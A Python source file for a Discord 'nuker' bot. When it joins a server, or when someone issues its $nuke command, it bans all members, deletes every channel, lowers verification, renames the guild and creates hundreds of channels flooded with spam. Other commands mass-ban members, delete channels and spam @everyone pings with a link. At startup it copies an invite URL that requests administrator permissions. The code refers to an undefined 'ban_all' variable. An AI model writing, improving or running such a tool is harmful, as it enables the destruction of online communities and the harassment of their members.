from colorama.initialise import init
import discord
from discord.ext import commands
from colorama import Fore
import json
import time

with open("config.json", "r") as f:
    f = json.load(f)


token = f.get("bot-token")
nuke_on_join = f.get("nuke_on_join")
guild_name = f.get("guild_name")
ban = f.get("ban")
channel_name = f.get("channel_name")
channel_name2 = f.get("channel_name2")
text = f.get("text")
reason = f.get("audit_log_reason")

init()

intents = discord.Intents.all()
client = commands.Bot(command_prefix="$", intents=intents)
client.remove_command('help')


class COLORS:
    r = Fore.LIGHTRED_EX
    g = Fore.LIGHTGREEN_EX
    lb = Fore.LIGHTBLUE_EX
    m = Fore.LIGHTMAGENTA_EX
    lc = Fore.LIGHTCYAN_EX
    c = Fore.CYAN
    y = Fore.LIGHTYELLOW_EX
    b = Fore.BLUE
    w = Fore.RESET


@client.event
async def on_ready():
    print(f'''

{COLORS.b}        
{COLORS.m}        ##    ##    ###    ########  ##     ##    ###       ##    ## ##     ## ##    ## ######## ########  
{COLORS.b}        ##   ##    ## ##   ##     ## ###   ###   ## ##      ###   ## ##     ## ##   ##  ##       ##     ## 
{COLORS.m}        ##  ##    ##   ##  ##     ## #### ####  ##   ##     ####  ## ##     ## ##  ##   ##       ##     ## 
{COLORS.b}        #####    ##     ## ########  ## ### ## ##     ##    ## ## ## ##     ## #####    ######   ########  
{COLORS.m}        ##  ##   ######### ##   ##   ##     ## #########    ##  #### ##     ## ##  ##   ##       ##   ##   
{COLORS.b}        ##   ##  ##     ## ##    ##  ##     ## ##     ##    ##   ### ##     ## ##   ##  ##       ##    ## 
{COLORS.m}        ##    ## ##     ## ##     ## ##     ## ##     ##    ##    ##  #######  ##    ## ######## ##     ##                                                                                                                                                                                                
{COLORS.b}       
                                            {COLORS.m}By: @SSL | https://github.com/dtbSSL                            
                                            {COLORS.b}Prefix: {client.command_prefix}                                                           
                                            {COLORS.m}Bot Name: {client.user} {Fore.RESET}''')                                                                                                                    
    time.sleep(0.3)                                                                                                   
    print(f'''                                                                                                         
        {COLORS.m}SETTINGS:
        {COLORS.b}[NUKE ON JOIN] - {COLORS.m}{nuke_on_join}
        {COLORS.b}[GUILD NAME] - {COLORS.m}{guild_name}
        {COLORS.b}[BAN ALL] - {COLORS.m}{ban_all}
        {COLORS.b}[CHANNEL NAME] - {COLORS.m}{channel_name}
        {COLORS.b}[SECOND CHANNEL NAME] - {COLORS.m}{channel_name2}    
        {COLORS.b}[TEXT] - {COLORS.m}{text}
        {COLORS.b}[REASON] - {COLORS.m}{reason}
    

        {COLORS.m}Type {client.command_prefix}help for help.
    ''')
    input1 = input(f"       {COLORS.b}Press{COLORS.m} enter {Fore.RESET}{COLORS.b}to{COLORS.m} continue: ")
    if input1 == "":
        import pandas as pd
        df=pd.DataFrame([f'https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot'])
        df.to_clipboard(index=True, header=True)
        print(f"        {COLORS.g}Succes!{COLORS.w}")
    else:
        pass


@client.command()
async def help(ctx):
    await ctx.message.delete()
    print("\nCommands:\nNuke - nukes the server\nspam [channel] - Spams @everyone ping 100 times\nban - Bans everyone in the server\ndelete - Deletes every channel\nmembers - Displays member count\n")

@client.event
async def on_guild_join(guild):
    if nuke_on_join == "true" or nuke_on_join == "true":
        try:
            await guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
        except:
            pass
        if guild.name == guild_name:
            print(f"{COLORS.g}[!] Edited Guild Name")
        if discord.VerificationLevel.none:
            print(f"{COLORS.g}[!] Edited Verification Level to NONE\n")
        if ban_all == "yes" or ban == "Yes":
            for members in guild.members:
                try:
                        await members.ban(reason=reason)
                        print(f"{COLORS.r}[!] Banned {members}")
                except:
                    pass
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{COLORS.m}[!] Deleted channel #{channel}")
            except:
                pass
        for i in range(200):
            try:
                await guild.create_text_channel(name=channel_name, reason=reason)
            except:
                print(f"{COLORS.r}[!] Could not create channel.{Fore.RESET}")
            if channel_name2 != '':
                try:
                    await guild.create_text_channel(name=channel_name2, reason=reason)
                except:
                    print(f"{COLORS.r}[!] Could not create second channel.{Fore.RESET}")

        


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
    except:
            pass
    if ctx.guild.name == guild_name:
            print(f"{COLORS.g}[!] Edited Guild Name")
    if discord.VerificationLevel.none:
            print(f"{COLORS.g}[!] Edited Verification Level to NONE\n")
    if ban_all == "true" or ban == "true":
            for members in ctx.guild.members:
                try:
                        await members.ban(reason=reason)
                        print(f"{COLORS.r}[!] Banned {members}")
                except:
                    pass
    for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{COLORS.m}[!] Deleted channel #{channel}")
            except:
                pass
    for i in range(200):
            try:
                await ctx.guild.create_text_channel(name=channel_name, reason=reason)
            except:
                print(f"{COLORS.r}[!] Could not create channel.{Fore.RESET}")
            if channel_name2 != '':
                try:
                    await ctx.guild.create_text_channel(name=channel_name2, reason=reason)
                except:
                    print(f"{COLORS.r}[!] Could not create second channel.{Fore.RESET}")


@client.event
async def on_guild_channel_create(channel):
    for i in range(100):
        await channel.send(text)

@client.command()
async def spam(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    for i in range(100):
        await channel.send("@everyone https://guns.lol/SSL")


@client.command(aliases=['ba'])
async def ban(ctx):
    await ctx.message.delete()
    for members in ctx.guild.members:
            try:
                    await members.ban(reason=reason)
                    print(f"{COLORS.r}[!] Banned {members}")
            except:
                pass


@client.command(aliases=['clear_channels'])
async def delete(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{COLORS.g}[!] Deleted channel #{channel}")
        except:
            pass


@client.command()
async def members(ctx):
    await ctx.message.delete()
    await ctx.send(f"member amount: {ctx.guild.member_count}")

client.run(token)
